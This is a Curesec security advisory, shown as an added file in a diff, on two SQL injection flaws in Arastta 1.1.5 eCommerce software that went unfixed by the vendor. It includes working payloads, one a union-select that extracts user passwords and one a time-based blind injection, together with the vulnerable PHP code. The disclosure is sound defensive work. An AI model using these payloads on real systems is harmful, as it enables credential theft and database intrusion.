@@ -1,0 +1,160 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    Arastta 1.1.5
+Fixed in:            not fixed
+Fixed Version Link:  n/a
+Vendor Website:      http://arastta.org/
+Vulnerability Type:  SQL Injection
+Remote Exploitable:  Yes
+Reported to vendor:  11/21/2015
+Disclosed to public: 12/21/2015
+Release mode:        Full Disclosure
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+Arastta is an eCommerce software written in PHP. In version 1.1.5, it is
+vulnerable to two SQL injection vulnerabilities, one normal injection when
+searching for products via tags, and one blind injection via the language
+setting. Both of them require a user with special privileges to trigger.
+
+3. SQL Injection 1
+
+CVSS
+
+Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description
+
+There is an SQL Injection when retrieving products.
+
+Currently, only the "filter" variable is vulnerable. Note that the "tag_name"
+variable would also be vulnerable to SQL injection, if there wasn't a filter
+that forbid single quotes in the URL. As defense in depth, it might be a good
+idea to sanitize that value here as well.
+
+Note that an account with the right "Catalog -> Filters" is needed to exploit
+this issue.
+
+Proof of Concept
+
+
+POST /Arastta/admin/index.php?route=catalog/product/autocomplete&token=3d6cfa8f9f602a4f47e0dfbdb989a469&filter_name=a&tag_name= HTTP/1.1
+
+tag_text[][value]=abc') union all select password from gv4_user -- -
+
+Code
+
+
+/admin/model/catalog/product.php
+public function getTags($tag_name, $filter_tags = null) {
+    [...]
+    $query = $this->db->query("SELECT DISTINCT(tag) FROM `" . DB_PREFIX . "product_description` WHERE `tag` LIKE '%" . $tag_name . "%'" . $filter);
+
+/admin/controller/catalog/product.php
+            public function autocomplete() {
+    [...]
+    if (isset($this->request->get['tag_name'])) {
+
+$this->load->model('catalog/product');
+
+if (isset($this->request->get['tag_name'])) {
+    $tag_name = $this->request->get['tag_name'];
+} else {
+    $tag_name = '';
+}
+
+$filter = null;
+
+if(isset($this->request->post['tag_text'])) {
+    $filter = $this->request->post['tag_text'];
+}
+
+$results = $this->model_catalog_product->getTags($tag_name, $filter);
+
+foreach ($results as $result) {
+    $json[] = array(
+'tag' => $result,
+'tag_id' => $result
+    );
+}
+    }
+
+4. SQL Injection 2
+
+CVSS
+
+Medium 6.5 AV:N/AC:L/Au:S/C:P/I:P/A:P
+
+Description
+
+There is a second order timing based SQL injection when choosing the language
+setting.
+
+An admin account with the right "Setting -> Setting" is needed to exploit this
+issue.
+
+Alternatively, a user with the right "Localisation -> Languages" can inject a
+payload as well. However, a user with the right "Setting -> Setting" is still
+needed to choose the malicious language to trigger the payload.
+
+Proof of Concept
+
+
+Visit the setting page:
+http://localhost/Arastta/admin/index.php?route=setting/setting
+
+For the config_language and config_admin_language parameters use:
+en' AND IF(SUBSTRING(version(), 1, 1)='5',BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null) -- -
+
+Visiting any site will trigger the injected code.
+
+Code
+
+
+/Arastta/system/library/utility.php
+public function getDefaultLanguage(){
+    if (!is_object($this->config)) {
+return;
+    }
+
+    $store_id = $this->config->get('config_store_id');
+
+    if (Client::isAdmin()){
+$sql = "SELECT * FROM " . DB_PREFIX . "setting WHERE `key` = 'config_admin_language' AND `store_id` = '" . $store_id . "'";
+    } else {
+$sql = "SELECT * FROM " . DB_PREFIX . "setting WHERE `key` = 'config_language' AND `store_id` = '" . $store_id . "'";
+    }
+    $query = $this->db->query($sql);
+    $code = $query->row['value'];
+
+    $language = $this->db->query("SELECT * FROM " . DB_PREFIX . "language WHERE `code` = '" . $code . "'");
+
+    return $language->row;
+}
+
+5. Solution
+
+This issue was not fixed by the vendor.
+
+6. Report Timeline
+
+11/21/2015 Informed Vendor about Issue (no reply)
+12/10/2015 Reminded Vendor of Disclosure Date (no reply)
+12/17/2015 Disclosed to public
+
+
+Blog Reference:
+https://blog.curesec.com/article/blog/Arastta-115-SQL-Injection-131.html
+ 
+--
+blog:  https://blog.curesec.com
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Romain-Rolland-Str 14-24
+13089 Berlin, Germany
